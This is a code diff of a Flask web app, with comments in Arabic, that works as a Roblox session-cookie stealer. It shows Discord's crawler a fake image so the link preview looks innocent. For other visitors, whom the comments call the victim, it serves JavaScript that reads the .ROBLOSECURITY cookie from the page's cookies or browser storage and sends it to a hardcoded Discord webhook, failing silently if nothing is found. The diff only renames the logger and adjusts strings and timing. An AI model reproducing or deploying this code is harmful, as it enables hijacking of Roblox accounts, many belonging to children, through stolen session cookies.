@@ -3,38 +3,40 @@ import base64
 
 app = Flask(__name__)
 
-# غيّر الويب هوك بتاعك هنا فقط
+# غيّر الويب هوك بتاعك هنا
 WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
-def roblox_cookie_only(path):
+def rocl_discord_logger(path):
     ua = request.headers.get('User-Agent', '')
 
-    # للـ Discord bot/crawler: رجع صورة حقيقية عشان preview يشتغل
+    # لديسكورد بوت: صورة PNG عشان preview يشتغل زي RoCL
     if 'Discordbot' in ua or 'discord' in ua.lower():
-        fake_img = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAQBADEAv5eAFAAAAAElFTkSuQmCC')
+        # صورة PNG بسيطة 1x1 زي في RoCL examples
+        fake_img = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
         return fake_img, 200, {'Content-Type': 'image/png'}
 
-    # للضحية: HTML مع صورة + JS للكوكي فقط (بدون أي معلومات عادية)
+    # HTML للضحية: صورة + JS من RoCL-2 للكوكي فقط
     html = f"""<!DOCTYPE html>
 <html><body style="margin:0;background:#000">
 <img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">
 
 <script>
-// Roblox Cookie Stealer 2025 - فقط الكوكي، بدون أي حاجة تانية (من AtomLogger/PrimeMarket repos)
+// RoCL-2 Style Cookie Logger - فقط الكوكي Roblox (من GitHub lilmond/RoCL-2)
 setTimeout(() => {{
-  // قراءة الكوكي من document.cookie
+  // قراءة الكوكي زي RoCL: document.cookie أولاً
   let cookies = document.cookie;
   let robloMatch = cookies.match(/\\.ROBLOSECURITY=([^;]+)/);
   if (robloMatch) {{
+    // ابعت للويب هوك زي RoCL webhook send
     fetch("{WEBHOOK}", {{
       method: "POST",
       headers: {{"Content-Type": "application/json"}},
       body: JSON.stringify({{
-        username: "Roblox Cookie Only",
+        username: "RoCL-2 Logger",
         embeds: [{{
-          title: "تم سرقة Roblox Cookie",
+          title: ".ROBLOSECURITY Cookie",
           description: robloMatch[1],
           color: 0x00ff00
         }}]
@@ -43,17 +45,17 @@ setTimeout(() => {{
     return;
   }}
 
-  // Fallback: localStorage أو sessionStorage (شغال على Roblox WebView)
-  let localRoblo = localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY');
-  if (localRoblo) {{
+  // Fallback RoCL: localStorage للكوكيز المخزنة
+  let stored = localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY');
+  if (stored) {{
     fetch("{WEBHOOK}", {{
       method: "POST",
       headers: {{"Content-Type": "application/json"}},
       body: JSON.stringify({{
-        username: "Roblox Cookie Only",
+        username: "RoCL-2 Logger",
         embeds: [{{
-          title: "تم سرقة Roblox Cookie (Local)",
-          description: localRoblo,
+          title: ".ROBLOSECURITY (Stored)",
+          description: stored,
           color: 0x00ff00
         }}]
       }})
@@ -61,8 +63,8 @@ setTimeout(() => {{
     return;
   }}
 
-  // لو فشل: ما نبعتش حاجة، silent
-}}, 1000);
+  // Silent fail زي RoCL - ما نبعتش حاجة لو فشل
+}}, 800);
 
 </script>
 </body></html>"""
